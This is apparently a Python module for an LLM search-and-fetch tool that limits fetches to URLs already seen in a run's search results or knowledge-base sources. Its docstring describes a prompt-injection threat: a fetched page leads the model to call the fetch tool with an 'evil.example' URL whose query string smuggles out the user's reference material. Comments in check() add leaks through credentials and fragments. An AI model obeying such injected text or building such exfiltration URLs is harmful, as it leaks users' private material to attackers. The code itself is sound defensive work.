"""search_fetch.known_urls — opt-in "only fetch what this run has already seen" policy.

Threat: a fetched page carries a prompt injection that makes the LLM call the fetch
tool with an attacker URL whose query string smuggles out run material
(`https://evil.example/?d=<excerpt of the user's 参考资料>`). url_guard cannot stop
that — the target is a perfectly public host.

With SEARCH_FETCH_ONLY_KNOWN_URLS=1, `sf fetch` accepts only URLs that appeared in
this run's search results (`sf search` registers every result link) or as a 来源
source of the run's knowledge base (`sf kb index` registers them). A URL carrying
freshly-invented data can never be on that list. Default OFF (no behaviour change):
it also blocks legitimate fetches of URLs the model learned elsewhere (e.g. a link
quoted in an article body, or a hosted web_search answer without a KB source line).

Ledger: <HOME>/runs/<run id>/known-urls.txt when the run id is set (a caller sets it;
`sf browser stop` deletes it with the run directory), else ./.search_fetchres/
known-urls.txt (scoped to the working folder).
"""

# The opt-in switch.
import os

# URL parsing and quoting.
import urllib.parse

# Results directory (ledger fallback) and the run directory.
from . import artifacts, config

# SERP redirect unwrapping (google.com/url?q=…).
from .docparse import _unwrap

# The refusal type shared with the outbound URL policy.
from .url_guard import BlockedURL

# Ledger file name.
LEDGER_NAME = "known-urls.txt"
# Characters left unescaped in a normalized path (query adds "=").
_SAFE = "/%:@!$&'()*+,;=-._~?"


def enabled() -> bool:
    """True when SEARCH_FETCH_ONLY_KNOWN_URLS is set to a true value."""
    # Same truth values as every other boolean knob.
    return (os.environ.get("SEARCH_FETCH_ONLY_KNOWN_URLS") or "0").strip().lower() in config._TRUE


def ledger_path():
    """Ledger of this run: under the run directory when there is one, else in ./.search_fetchres."""
    # Runs with an id have a run directory that `sf browser stop` removes.
    if config.RUN_DIR is not None:
        return config.RUN_DIR / LEDGER_NAME
    # Standalone use: scoped to the working folder.
    return artifacts._outdir() / LEDGER_NAME


def normalize(url: str) -> str:
    """Canonical comparison key: fragment dropped, scheme/host lower-cased, default
    port dropped, non-ASCII percent-encoded (the runner encodes CJK paths before
    fetching), trailing slash ignored. '' for anything that is not http(s)."""
    # Parse; a malformed port raises ValueError.
    try:
        p = urllib.parse.urlsplit((url or "").strip())
        port = p.port
    except ValueError:
        return ""
    # Scheme in lower case.
    scheme = (p.scheme or "").lower()
    # Host in lower case without a trailing dot.
    host = (p.hostname or "").rstrip(".")
    # Only http(s) URLs with a host are keys.
    if scheme not in ("http", "https") or not host:
        return ""
    # Internationalized host names in their ASCII form.
    try:
        host = host.encode("idna").decode("ascii")
    except UnicodeError:
        pass
    # Keep only non-default ports.
    if port and not ((scheme == "http" and port == 80) or (scheme == "https" and port == 443)):
        host = f"{host}:{port}"
    # Path percent-encoded, trailing slash ignored.
    path = urllib.parse.quote(p.path or "/", safe=_SAFE).rstrip("/")
    # Query percent-encoded the same way.
    query = urllib.parse.quote(p.query, safe=_SAFE + "=")
    # The key.
    return f"{scheme}://{host}{path}" + (f"?{query}" if query else "")


def _fragment(url: str) -> str:
    """Fragment of url ('' when it has none or does not parse)."""
    # A malformed URL has no fragment to speak of.
    try:
        return urllib.parse.urlsplit((url or "").strip()).fragment
    except ValueError:
        return ""


def _forms(url: str) -> set:
    """The URL itself plus its SERP-redirect-unwrapped target (fragment ignored)."""
    # Both normalized keys.
    out = {normalize(url), normalize(_unwrap(url))}
    # Non-http(s) forms normalize to "".
    out.discard("")
    # The keys.
    return out


def _ledger_keys(url: str) -> set:
    """What `register` records for one URL: its `_forms`, plus the exact key WITH its
    fragment when it has one (so that very fragment stays fetchable — see `check`)."""
    # Fragment-free keys.
    keys = _forms(url)
    # The fragment and the plain key.
    frag, key = _fragment(url), normalize(url)
    # The exact fragment the search result carried.
    if frag and key:
        keys.add(f"{key}#{frag}")
    # All keys.
    return keys


def register(urls) -> int:
    """Append the http(s) URLs to the run's ledger. Returns how many were written."""
    # Unique keys of all URLs, sorted for a stable file.
    lines = sorted({k for u in urls for k in _ledger_keys(str(u))})
    # Nothing to record.
    if not lines:
        return 0
    # Ledger file.
    p = ledger_path()
    # Private directory for run state.
    p.parent.mkdir(parents=True, exist_ok=True, mode=0o700)
    # One append per call (O_APPEND keeps concurrent writers from interleaving).
    with p.open("a", encoding="utf-8") as f:
        f.write("\n".join(lines) + "\n")
    # How many keys were written.
    return len(lines)


def known() -> set:
    """Keys in the ledger (empty when there is none yet)."""
    # A missing ledger means nothing is known.
    try:
        return set(ledger_path().read_text(encoding="utf-8").split())
    except OSError:
        return set()


def check(url: str) -> str:
    """No-op unless enabled; then raise url_guard.BlockedURL for a URL this run has
    not seen in search results / KB sources. Returns the URL to fetch: a known URL
    with an UNREGISTERED fragment comes back without it (callers must fetch the
    returned value), and a URL with credentials (user@host) is refused."""
    # The policy is opt-in.
    if not enabled():
        return url
    # Parse once; a malformed URL falls through to the "unknown" refusal.
    try:
        parts = urllib.parse.urlsplit((url or "").strip())
    except ValueError:
        parts = None
    # The key ignores userinfo and fragment, so either could smuggle invented data on top of a
    # KNOWN URL: credentials go to the server on an auth challenge, and a fragment (never sent to
    # the server) is readable by the page's own scripts.
    if parts is not None and (parts.username is not None or parts.password is not None):
        raise BlockedURL("URL carries credentials (user@host) — refused under "
                         "SEARCH_FETCH_ONLY_KNOWN_URLS=1")
    # Fragment of the request.
    frag = parts.fragment if parts is not None else ""
    # Ledger keys.
    seen = known()
    # This exact fragment came from a search result or KB source.
    if frag and f"{normalize(url)}#{frag}" in seen:
        return url
    # Known page; a fragment the ledger does not hold is dropped from what is fetched.
    if _forms(url) & seen:
        return urllib.parse.urlunsplit(parts._replace(fragment="")) if frag else url
    # Unknown URL.
    raise BlockedURL("not among this run's search results / knowledge-base sources "
                     "(SEARCH_FETCH_ONLY_KNOWN_URLS=1)")
